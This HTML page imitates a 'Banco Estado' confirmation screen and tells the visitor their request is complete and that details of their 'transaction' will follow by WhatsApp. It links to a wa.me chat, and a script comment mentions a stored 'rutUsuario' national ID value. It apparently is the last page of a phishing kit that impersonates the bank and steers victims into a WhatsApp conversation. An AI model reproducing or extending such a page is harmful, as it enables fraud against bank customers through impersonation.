<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" type="image/png" href="favicon.png">
    <title>Banco Estado</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Oxygen', 'Ubuntu', 'Cantarell', sans-serif;
            background: linear-gradient(135deg, #f5f5f5 0%, #e8e8e8 100%);
            min-height: 100vh;
            display: flex;
            align-items: flex-start;
            justify-content: center;
            padding: 20px;
        }

        .container {
            width: 100%;
            max-width: 450px;
            background: white;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
            padding: 40px 30px;
            margin-top: 20px;
            text-align: center;
        }

        .header {
            display: flex;
            justify-content: center;
            align-items: center;
            margin-bottom: 30px;
        }

        .logo-container {
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .logo {
            width: 40px;
            height: 40px;
            background: linear-gradient(135deg, #FF5C00 0%, #FF8C00 100%);
            border-radius: 4px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            color: white;
            font-size: 20px;
        }

        .logo-text {
            font-size: 18px;
            font-weight: 600;
            color: #1a1a1a;
            letter-spacing: -0.5px;
        }

        .logo-img {
            width: 155px;
            height: 155px;
            display: flex;
            align-items: center;
            justify-content: center;
            background: none;
            border: none;
            padding: 0;
            margin: 0 auto 20px;
        }

        .logo-img img {
            width: 100%;
            height: 100%;
            object-fit: contain;
        }

        .success-icon {
            width: 80px;
            height: 80px;
            background: linear-gradient(135deg, #1ABC9C 0%, #16A085 100%);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 30px;
            animation: scaleIn 0.6s cubic-bezier(0.34, 1.56, 0.64, 1);
            box-shadow: 0 8px 24px rgba(26, 188, 156, 0.3);
        }

        .checkmark {
            font-size: 48px;
            color: white;
            font-weight: 700;
            animation: bounceIn 0.8s cubic-bezier(0.34, 1.56, 0.64, 1) 0.3s backwards;
        }

        .title {
            font-size: 28px;
            font-weight: 700;
            color: #1a2842;
            margin-bottom: 15px;
            animation: fadeInUp 0.8s ease-out 0.2s backwards;
        }

        .subtitle {
            font-size: 16px;
            color: #666666;
            margin-bottom: 40px;
            line-height: 1.6;
            animation: fadeInUp 0.8s ease-out 0.4s backwards;
        }

        .message-box {
            background: linear-gradient(135deg, #E8F5E9 0%, #F1F8E9 100%);
            border-left: 4px solid #1ABC9C;
            border-radius: 8px;
            padding: 20px;
            margin-bottom: 30px;
            animation: slideInLeft 0.8s ease-out 0.6s backwards;
        }

        .message-icon {
            font-size: 28px;
            margin-bottom: 10px;
        }

        .message-text {
            font-size: 14px;
            color: #2E7D32;
            font-weight: 500;
            line-height: 1.6;
        }

        .whatsapp-section {
            display: flex;
            flex-direction: column;
            gap: 12px;
            animation: fadeInUp 0.8s ease-out 0.8s backwards;
        }

        .whatsapp-text {
            font-size: 13px;
            color: #666666;
            margin-bottom: 5px;
        }

        .whatsapp-btn {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #25D366 0%, #1DA851 100%);
            color: white;
            border: none;
            border-radius: 50px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 4px 12px rgba(37, 211, 102, 0.3);
            text-decoration: none;
        }

        .whatsapp-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 16px rgba(37, 211, 102, 0.4);
        }

        .whatsapp-btn:active {
            transform: translateY(0);
        }

        .whatsapp-icon {
            font-size: 20px;
        }

        .additional-info {
            font-size: 12px;
            color: #A8A8B3;
            margin-top: 30px;
            padding-top: 20px;
            border-top: 1px solid #E8E8F0;
            animation: fadeIn 0.8s ease-out 1s backwards;
        }

        @keyframes scaleIn {
            0% {
                transform: scale(0);
                opacity: 0;
            }
            100% {
                transform: scale(1);
                opacity: 1;
            }
        }

        @keyframes bounceIn {
            0% {
                transform: scale(0);
                opacity: 0;
            }
            50% {
                transform: scale(1.1);
            }
            100% {
                transform: scale(1);
                opacity: 1;
            }
        }

        @keyframes fadeInUp {
            0% {
                transform: translateY(20px);
                opacity: 0;
            }
            100% {
                transform: translateY(0);
                opacity: 1;
            }
        }

        @keyframes slideInLeft {
            0% {
                transform: translateX(-20px);
                opacity: 0;
            }
            100% {
                transform: translateX(0);
                opacity: 1;
            }
        }

        @keyframes fadeIn {
            0% {
                opacity: 0;
            }
            100% {
                opacity: 1;
            }
        }

        @media (max-width: 480px) {
            .container {
                padding: 30px 20px;
                border-radius: 16px;
            }

            .title {
                font-size: 24px;
            }

            .success-icon {
                width: 70px;
                height: 70px;
            }

            .checkmark {
                font-size: 40px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Header con Logo -->
        <div class="header">
            <div class="logo-container">
                <div class="logo-img">
                    <img src="logo-banco-estado.svg" alt="Logo">
                </div>
            </div>
        </div>

        <!-- Ícono de éxito -->
        <div class="success-icon">
            <div class="checkmark">✓</div>
        </div>

        <!-- Título -->
        <h1 class="title">¡Proceso Completado!</h1>

        <!-- Subtítulo -->
        <p class="subtitle">Tu solicitud ha sido procesada correctamente. Nos pondremos en contacto contigo en breve.</p>

        <!-- Caja de mensaje -->
        <div class="message-box">
            <div class="message-icon">📱</div>
            <div class="message-text">Nos comunicaremos contigo vía WhatsApp con los detalles de tu transacción.</div>
        </div>

        <!-- Sección WhatsApp -->
        <div class="whatsapp-section">
            <div class="whatsapp-text">¿Preguntas? Contáctanos directamente:</div>
            <a href="https://wa.me/56912345678" target="_blank" class="whatsapp-btn">
                <span class="whatsapp-icon">💬</span>
                Escribir por WhatsApp
            </a>
        </div>

        <!-- Información adicional -->
        <div class="additional-info">
            Tiempo estimado de procesamiento: 24-48 horas
        </div>
    </div>

    <script>
        // Limpiar localStorage al completar
        window.addEventListener('load', function() {
            // Opcionalmente puedes limpiar el localStorage
            // localStorage.removeItem('rutUsuario');
        });
    </script>
</body>
</html>
